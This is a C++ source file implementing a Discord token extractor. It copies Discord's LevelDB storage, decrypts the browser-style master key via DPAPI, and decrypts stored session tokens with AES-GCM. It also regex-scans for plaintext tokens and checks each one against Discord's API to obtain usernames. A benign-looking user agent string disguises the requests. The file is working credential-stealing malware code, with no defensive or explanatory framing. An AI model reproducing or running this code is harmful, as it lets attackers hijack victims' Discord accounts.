#include "token_extractor.h"

#include <windows.h>
#include <dpapi.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <wininet.h>

#include <nlohmann/json.hpp>

#include <fstream>
#include <sstream>
#include <algorithm>
#include <regex>
#include <cstring>
#include <filesystem>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

std::string TokenExtractor::GetAppDataPath() {
    char path[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, path))) {
        return std::string(path);
    }
    // Fallback: read environment variable
    const char* env = std::getenv("APPDATA");
    return env ? std::string(env) : "";
}

static std::string ToLower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return s;
}

// ---------------------------------------------------------------------------
// Base64 decode
// ---------------------------------------------------------------------------

static const char kBase64Table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::vector<uint8_t> TokenExtractor::Base64Decode(const std::string& input) {
    std::vector<uint8_t> result;
    if (input.empty()) return result;

    // Build decode table
    int decode[256] = {};
    std::fill_n(decode, 256, -1);
    for (int i = 0; i < 64; ++i) {
        decode[static_cast<unsigned char>(kBase64Table[i])] = i;
    }
    decode[static_cast<unsigned char>('=')] = 0;

    uint32_t accum = 0;
    int bits = 0;
    for (char c : input) {
        if (c == '\n' || c == '\r' || c == ' ' || c == '\t') continue;
        int val = decode[static_cast<unsigned char>(c)];
        if (val < 0) continue;
        accum = (accum << 6) | val;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            result.push_back(static_cast<uint8_t>((accum >> bits) & 0xFF));
        }
    }
    return result;
}

// ---------------------------------------------------------------------------
// Copy LevelDB to temp directory
// ---------------------------------------------------------------------------

bool TokenExtractor::CopyLeveldbToTemp(const std::string& leveldb_path,
                                         std::string& out_temp_path) {
    // Create temp directory
    char temp_dir[MAX_PATH] = {};
    GetTempPathA(MAX_PATH, temp_dir);
    out_temp_path = std::string(temp_dir) + "discord_token_scan_" +
                    std::to_string(GetCurrentProcessId());

    fs::create_directories(out_temp_path);

    bool copied = false;
    for (const auto& entry : fs::directory_iterator(leveldb_path)) {
        std::string ext = ToLower(entry.path().extension().string());
        if (ext == ".log" || ext == ".ldb" || ext == ".sst") {
            std::string dest = out_temp_path + "\\" + entry.path().filename().string();
            std::error_code ec;
            fs::copy_file(entry.path(), dest, fs::copy_options::skip_existing, ec);
            if (!ec) copied = true;
        }
    }

    return copied;
}

// ---------------------------------------------------------------------------
// Find encrypted tokens (dQw4w9WgXcQ: prefix)
// ---------------------------------------------------------------------------

std::vector<std::string> TokenExtractor::FindEncryptedTokens(const std::string& file_path) {
    std::vector<std::string> results;

    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) return results;

    std::string content((std::istreambuf_iterator<char>(file)),
                         std::istreambuf_iterator<char>());
    file.close();

    const std::string prefix = "dQw4w9WgXcQ:";
    size_t pos = 0;
    while ((pos = content.find(prefix, pos)) != std::string::npos) {
        pos += prefix.length();
        // Extract base64 data until we hit a non-base64 character
        size_t end = pos;
        while (end < content.size()) {
            char c = content[end];
            bool is_b64 = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                          (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=';
            if (!is_b64) break;
            end++;
        }
        if (end - pos >= 20) { // minimum length for valid encrypted data
            results.push_back(content.substr(pos, end - pos));
        }
        pos = end;
    }

    return results;
}

// ---------------------------------------------------------------------------
// Find plaintext tokens (regex patterns)
// ---------------------------------------------------------------------------

std::vector<std::string> TokenExtractor::FindPlaintextTokens(const std::string& file_path) {
    std::vector<std::string> results;

    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) return results;

    std::string content((std::istreambuf_iterator<char>(file)),
                         std::istreambuf_iterator<char>());
    file.close();

    // Standard bot/user token: 3 parts separated by dots
    std::regex reg1(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
    std::regex reg2(R"([\w-]{24}\.[\w-]{6}\.[\w-]{38})");
    // MFA token
    std::regex reg3(R"(mfa\.[\w-]{84})");

    for (auto& re : {reg1, reg2, reg3}) {
        std::sregex_iterator it(content.begin(), content.end(), re);
        std::sregex_iterator end;
        for (; it != end; ++it) {
            results.push_back(it->str());
        }
    }

    return results;
}

// ---------------------------------------------------------------------------
// DPAPI: decrypt master key from Local State
// ---------------------------------------------------------------------------

bool TokenExtractor::GetMasterKey(const std::string& discord_path,
                                    std::vector<uint8_t>& out_key) {
    // Read Local State
    std::string local_state_path = discord_path + "\\Local State";
    std::ifstream file(local_state_path);
    if (!file.is_open()) return false;

    json root;
    try {
        file >> root;
    } catch (...) {
        return false;
    }

    // Get encrypted_key
    if (!root.contains("os_crypt") || !root["os_crypt"].contains("encrypted_key")) {
        return false;
    }
    std::string enc_key_b64 = root["os_crypt"]["encrypted_key"].get<std::string>();

    // Base64 decode
    std::vector<uint8_t> enc_key = Base64Decode(enc_key_b64);
    if (enc_key.size() < 5) return false;

    // Strip "DPAPI" prefix (5 bytes: 0x44 50 41 50 49)
    if (std::memcmp(enc_key.data(), "DPAPI", 5) != 0) return false;
    std::vector<uint8_t> dpapi_data(enc_key.begin() + 5, enc_key.end());

    // Decrypt via DPAPI
    DATA_BLOB input_blob = {};
    input_blob.cbData = static_cast<DWORD>(dpapi_data.size());
    input_blob.pbData = dpapi_data.data();

    DATA_BLOB output_blob = {};
    if (!CryptUnprotectData(&input_blob, nullptr, nullptr, nullptr, nullptr, 0, &output_blob)) {
        return false;
    }

    out_key.assign(output_blob.pbData, output_blob.pbData + output_blob.cbData);
    LocalFree(output_blob.pbData);
    return true;
}

// ---------------------------------------------------------------------------
// AES-256-GCM decryption
// ---------------------------------------------------------------------------

std::string TokenExtractor::DecryptToken(const std::vector<uint8_t>& master_key,
                                           const std::string& encrypted_b64) {
    std::vector<uint8_t> data = Base64Decode(encrypted_b64);
    if (data.size() < 32) return ""; // 3 version + 12 IV + 1 ciphertext + 16 tag minimum

    // Strip 3-byte version prefix (e.g., "v10")
    const uint8_t* iv        = data.data() + 3;
    size_t        iv_len     = 12;
    const uint8_t* ciphertext = data.data() + 3 + 12;
    size_t        cipher_len = data.size() - 3 - 12 - 16; // minus tag
    const uint8_t* tag       = data.data() + data.size() - 16;

    if (cipher_len == 0) return "";

    // Use BCrypt for AES-GCM
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM,
                                                   nullptr, 0);
    if (status != 0) return "";

    // Enable GCM chaining mode
    std::vector<BYTE> chain_mode_str(sizeof(BCRYPT_CHAIN_MODE_GCM));
    memcpy(chain_mode_str.data(), BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM));
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                                chain_mode_str.data(),
                                static_cast<ULONG>(chain_mode_str.size()), 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    // Create key object
    BCRYPT_KEY_HANDLE hKey = nullptr;
    status = BCryptGenerateSymmetricKey(hAlg, &hKey,
                                         nullptr, 0,
                                         const_cast<PUCHAR>(master_key.data()),
                                         static_cast<ULONG>(master_key.size()), 0);
    if (status != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    // Set up GCM auth info
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = const_cast<PUCHAR>(iv);
    authInfo.cbNonce = static_cast<ULONG>(iv_len);
    authInfo.pbAuthData = nullptr;
    authInfo.cbAuthData = 0;
    authInfo.pbTag = const_cast<PUCHAR>(tag);
    authInfo.cbTag = 16;
    authInfo.pbMacContext = nullptr;
    authInfo.cbMacContext = 0;
    authInfo.cbAAD = 0;
    authInfo.dwFlags = 0;

    // Decrypt
    std::vector<uint8_t> plaintext(cipher_len);
    ULONG output_len = 0;
    status = BCryptDecrypt(hKey,
                            const_cast<PUCHAR>(ciphertext),
                            static_cast<ULONG>(cipher_len),
                            &authInfo,
                            const_cast<PUCHAR>(iv),
                            static_cast<ULONG>(iv_len),
                            plaintext.data(),
                            static_cast<ULONG>(plaintext.size()),
                            &output_len, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (status != 0) return "";

    return std::string(plaintext.begin(), plaintext.begin() + output_len);
}

// ---------------------------------------------------------------------------
// Scan leveldb directory
// ---------------------------------------------------------------------------

std::vector<std::string> TokenExtractor::ScanLeveldb(const std::string& dir,
                                                       const std::string& discord_path) {
    std::vector<std::string> tokens;

    // Try to get the master key for encrypted tokens.
    // discord_path is passed in from Extract() so we don't misderive it
    // from the temp directory.
    std::vector<uint8_t> master_key;
    bool has_master_key = GetMasterKey(discord_path, master_key);

    for (const auto& entry : fs::directory_iterator(dir)) {
        std::string ext = ToLower(entry.path().extension().string());
        if (ext != ".log" && ext != ".ldb" && ext != ".sst") continue;

        std::string file_path = entry.path().string();

        // Try encrypted tokens first
        if (has_master_key) {
            auto encrypted = FindEncryptedTokens(file_path);
            for (auto& enc_b64 : encrypted) {
                std::string decrypted = DecryptToken(master_key, enc_b64);
                if (!decrypted.empty()) {
                    tokens.push_back(decrypted);
                }
            }
        }

        // Fallback: plaintext token scan
        auto plain = FindPlaintextTokens(file_path);
        tokens.insert(tokens.end(), plain.begin(), plain.end());
    }

    // Deduplicate
    std::sort(tokens.begin(), tokens.end());
    tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());

    return tokens;
}

// ---------------------------------------------------------------------------
// Token validation via HTTP
// ---------------------------------------------------------------------------

bool TokenExtractor::ValidateToken(const std::string& token, std::string& out_username) {
    HINTERNET hInternet = InternetOpenA("DiscordPresenceUpdater/1.0",
                                          INTERNET_OPEN_TYPE_DIRECT,
                                          nullptr, nullptr, 0);
    if (!hInternet) return false;
    DWORD ms = 10000;
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &ms, sizeof(ms));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT,    &ms, sizeof(ms));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &ms, sizeof(ms));

    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com",
                                            INTERNET_DEFAULT_HTTPS_PORT,
                                            nullptr, nullptr,
                                            INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    const char* accept_types[] = {"application/json", nullptr};
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET",
                                            "/api/v9/users/@me",
                                            nullptr, nullptr,
                                            accept_types,
                                            INTERNET_FLAG_SECURE |
                                            INTERNET_FLAG_NO_CACHE_WRITE |
                                            INTERNET_FLAG_RELOAD,
                                            0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    std::string auth_header = "Authorization: " + token;
    if (!HttpSendRequestA(hRequest, auth_header.c_str(),
                          static_cast<DWORD>(auth_header.length()), nullptr, 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Read response
    DWORD status_code = 0;
    DWORD status_len = sizeof(status_code);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                    &status_code, &status_len, nullptr);

    bool valid = false;
    if (status_code == 200) {
        valid = true;
        // Read body for username
        std::string body;
        char buf[4096];
        DWORD read = 0;
        while (InternetReadFile(hRequest, buf, sizeof(buf), &read) && read > 0) {
            body.append(buf, read);
        }
        auto resp = json::parse(body, nullptr, false);
        if (!resp.is_discarded()) {
            std::string user = resp.value("username", "");
            std::string disc = resp.value("discriminator", "");
            if (!user.empty()) {
                out_username = disc == "0" ? user : user + "#" + disc;
            }
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return valid;
}

// ---------------------------------------------------------------------------
// Main extraction entry point
// ---------------------------------------------------------------------------

std::vector<ExtractedToken> TokenExtractor::Extract() {
    std::vector<ExtractedToken> results;

    std::string appdata = GetAppDataPath();
    if (appdata.empty()) return results;

    // Discord install variants to check
    const char* variants[] = {"discord", "discordcanary", "discordptb", "discorddevelopment"};

    for (const char* variant : variants) {
        std::string discord_path = appdata + "\\" + variant;
        std::string leveldb_path = discord_path + "\\Local Storage\\leveldb";

        if (!fs::exists(leveldb_path)) continue;

        // Copy to temp (Discord locks files while running)
        std::string temp_path;
        if (!CopyLeveldbToTemp(leveldb_path, temp_path)) continue;

        // Scan the temp copies, passing the real discord_path so GetMasterKey
        // can find "Local State" in the correct directory.
        auto tokens = ScanLeveldb(temp_path, discord_path);

        // Cleanup temp directory
        std::error_code ec;
        fs::remove_all(temp_path, ec);

        // Validate each token
        for (auto& token : tokens) {
            ExtractedToken et;
            et.token = token;
            et.is_valid = ValidateToken(token, et.username);
            results.push_back(et);
        }

        // If we found valid tokens, no need to check other variants
        bool any_valid = false;
        for (auto& r : results) {
            if (r.is_valid) { any_valid = true; break; }
        }
        if (any_valid) break;
    }

    return results;
}